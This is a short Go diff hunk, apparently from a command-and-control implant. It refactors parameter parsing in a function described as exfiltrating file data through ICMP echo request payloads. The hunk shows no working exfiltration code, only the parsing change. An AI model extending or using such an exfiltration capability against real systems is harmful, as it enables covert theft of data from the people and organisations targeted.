@@ -47,9 +47,9 @@ const (
 
 // executeICMPExfil sends file data encoded in ICMP echo request payloads.
 func executeICMPExfil(task structs.Task) structs.CommandResult {
-	var args icmpExfilArgs
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := requireParams[icmpExfilArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.Target == "" {
